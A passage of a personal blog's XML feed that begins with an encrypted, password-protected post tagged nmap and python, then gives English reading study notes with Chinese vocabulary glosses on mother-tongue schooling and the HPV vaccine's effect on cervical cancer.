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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="0x02 应用实践" scheme="blog.manhao6.cn/categories/0x02-%E5%BA%94%E7%94%A8%E5%AE%9E%E8%B7%B5/"/>
    
      <category term="python" scheme="blog.manhao6.cn/categories/0x02-%E5%BA%94%E7%94%A8%E5%AE%9E%E8%B7%B5/python/"/>
    
    
      <category term="nmap" scheme="blog.manhao6.cn/tags/nmap/"/>
    
      <category term="python" scheme="blog.manhao6.cn/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>EnglisReading-2</title>
    <link href="blog.manhao6.cn/2019/01/09/EnglisReading-2/"/>
    <id>blog.manhao6.cn/2019/01/09/EnglisReading-2/</id>
    <published>2019-01-09T15:51:03.000Z</published>
    <updated>2019-04-15T08:59:24.624Z</updated>
    
    <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>Young children should be taught in their mother tongue, not in English</p></blockquote><a id="more"></a><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">tongue:</span>舌头 语言</span><br><span class="line">    mother <span class="string">tongue :</span>母语</span><br></pre></td></tr></table></figure><p>English perfectly exemplifies the “network effects” of a global tongue: the more people use it, the more useful it is. Over a billion people speak it as either their first or second language; more still as a third or fourth language.<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">exemplifies:作为、、典型</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">the</span> more people use <span class="keyword">it</span>, <span class="keyword">the</span> more useful <span class="keyword">it</span> is. </span><br><span class="line">     <span class="keyword">the</span> more 、、、 <span class="keyword">the</span> more、、、</span><br><span class="line">    </span><br><span class="line">Over <span class="keyword">a</span> billion people speak <span class="keyword">it</span> <span class="keyword">as</span> either their <span class="keyword">first</span> <span class="keyword">or</span> <span class="keyword">second</span> language</span><br><span class="line">     <span class="keyword">as</span> 作为</span><br></pre></td></tr></table></figure></p><p>Parents’ desire for their children to master English is spurring the growth of private schooling. Education authorities are switching to English medium, in part to stem the outflow of children into the private sector.<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">master English :master v.精通 <span class="comment">--&gt;精通英语</span></span><br><span class="line"></span><br><span class="line">spur：</span><br><span class="line">     n. 鼓舞，刺激；马刺；山坡</span><br><span class="line">     vi. 骑马疾驰；给予刺激</span><br><span class="line">     vt. 激励，鞭策；给…装踢马刺</span><br><span class="line">     n. (Spur)人名；(意)斯普尔；(德)施普尔</span><br><span class="line">     spur <span class="keyword">into</span> action</span><br><span class="line">     eg：i was spur <span class="keyword">into</span> action <span class="keyword">by</span> her speech</span><br><span class="line">     </span><br><span class="line">Education authoritie  教育部门</span><br><span class="line"> </span><br><span class="line">medium/ˈmiːdiəm/</span><br><span class="line"> n. （传播或表达的）媒体，方法；教学媒介语言</span><br><span class="line"> e.g.</span><br><span class="line"> 相关词汇：media (n.)</span><br><span class="line">        搭配短语：medium <span class="keyword">of</span> instruction</span><br><span class="line">        例句：English is still <span class="keyword">the</span> main medium <span class="keyword">of</span> instruction <span class="keyword">in</span> Nigeria</span><br><span class="line"></span><br><span class="line"><span class="keyword">in</span> part 在一定程度</span><br><span class="line"></span><br><span class="line">stem ：阻止</span><br><span class="line">    <span class="built_in">to</span> stem <span class="keyword">the</span> tide <span class="keyword">of</span> immigration</span><br><span class="line"></span><br><span class="line">sector ：部门 这里只学校</span><br></pre></td></tr></table></figure></p><p>Teaching children in English is fine if that is what they speak at home and their parents are fluent in it. But that is not the case in most public and low-cost private schools. Children are taught in a language they don’t understand by teachers whose English is poor. The children learn neither English nor anything else.</p><p>Research demonstrates that children learn more when they are taught in their mother tongue than they do when they are taught in any other language. In a study of children in the first three years in 12 schools in Cameroon, those taught in Kom did better than those taught in English in all subjects.<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">demonstrates :</span>证实，证明</span><br></pre></td></tr></table></figure></p><p>English should be an important subject at school, but not necessarily the language of instruction. Rather than switching to English-medium teaching, governments fearful of losing custom to the private sector should look at the many possible ways of improving public schools.<br><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">language <span class="keyword">of</span> instruction</span><br><span class="line"> 教学语言</span><br><span class="line"> e.g.</span><br><span class="line"> instruction 英文释义： the act <span class="keyword">of</span> teaching sth. <span class="keyword">to</span> sb.</span><br><span class="line">        例句：<span class="keyword">In</span> Malaysia, the primary language <span class="keyword">of</span> instruction <span class="keyword">is</span> English.</span><br><span class="line"></span><br><span class="line">fearful <span class="keyword">of</span> :惧怕</span><br><span class="line"></span><br><span class="line"><span class="keyword">custom</span>/ˈkʌstəm/</span><br><span class="line"> n. （经常性的）顾客，客源</span><br><span class="line"> e.g.</span><br><span class="line"> 相关词汇：customer (n.)  </span><br><span class="line"> 例句：Thank you <span class="keyword">for</span> your <span class="keyword">custom</span>.</span><br><span class="line"></span><br><span class="line">look at</span><br><span class="line"> 思考，考虑</span><br><span class="line"> e.g.</span><br><span class="line"> 英文释义：<span class="keyword">to</span> think about, consider <span class="keyword">or</span> study something</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote class=&quot;blockquote-center&quot;&gt;&lt;p&gt;Young children should be taught in their mother tongue, not in English&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="0x05 生活杂项" scheme="blog.manhao6.cn/categories/0x05-%E7%94%9F%E6%B4%BB%E6%9D%82%E9%A1%B9/"/>
    
      <category term="English Reading Comprehension" scheme="blog.manhao6.cn/categories/0x05-%E7%94%9F%E6%B4%BB%E6%9D%82%E9%A1%B9/English-Reading-Comprehension/"/>
    
    
      <category term="EnglishReading" scheme="blog.manhao6.cn/tags/EnglishReading/"/>
    
  </entry>
  
  <entry>
    <title>EnglisReading-1</title>
    <link href="blog.manhao6.cn/2019/01/08/%E6%B5%81%E5%88%A9%E9%98%85%E8%AF%BB-1/"/>
    <id>blog.manhao6.cn/2019/01/08/流利阅读-1/</id>
    <published>2019-01-08T15:01:08.000Z</published>
    <updated>2019-04-15T09:09:41.248Z</updated>
    
    <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>Vaccine could virtually eliminate cervical cancer：study</p></blockquote><a id="more"></a><ul><li>vaccine：疫苗<blockquote><p>eg：vaccine against tetaus（破伤风）<br>vaccination 接种</p></blockquote></li><li>cervical：宫颈的 – cervix 子宫颈<blockquote><p>eg：cervial cancer </p></blockquote></li><li>virtually ：实质上，实际上<blockquote><p>eg：he was virtually a prisoner<br> be virtually forgotten（几乎被遗忘）</p></blockquote></li></ul><p>The rapid scale-up of the human papillomavirus (HPV) vaccine could virtually eliminate cervical cancer in a handful of rich countries within three decades, and in most other nations by century’s end, researchers said Wednesday.</p><ul><li>scale-up 扩大<blockquote><p>scale v.扩大 增大<br>eg：the scale-up of 5G technology</p></blockquote></li><li>papillomavirus 乳头瘤</li><li>a handful of :少量的<blockquote><p>minorty 少量的，少数</p></blockquote></li></ul><p>Without screening and HPV vaccination, more than 44 million women will likely be diagnosed with the disease over the next 50 years, they reported in The Lancet Oncology, a medical journal.</p><ul><li>screening ：检察，筛选<blockquote><p>screen n.屏幕，屏风 v.放映 拍摄</p></blockquote></li><li>diagnose:诊断<blockquote><p>be diagnose with sth<br>he has  recently been diagnosed<br>with diabetes</p></blockquote></li></ul><p>By contrast, the rapid deployment starting in 2020 of screening and vaccination could prevent more than 13 million cervical cancers by mid-century worldwide, and lower the number of cases to below four-per-100, 000 women, the study found.</p><ul><li>by contrast 与之相比，相反<blockquote><p>in contrast 相比之下</p></blockquote></li><li>deployment n.部署 应用<blockquote><p>v. deploy 部署<br>the deployment of AI technology</p></blockquote></li><li>mid-century 中业</li></ul><p>“This is a potential threshold for considering cervical cancer to be eliminated as a major public 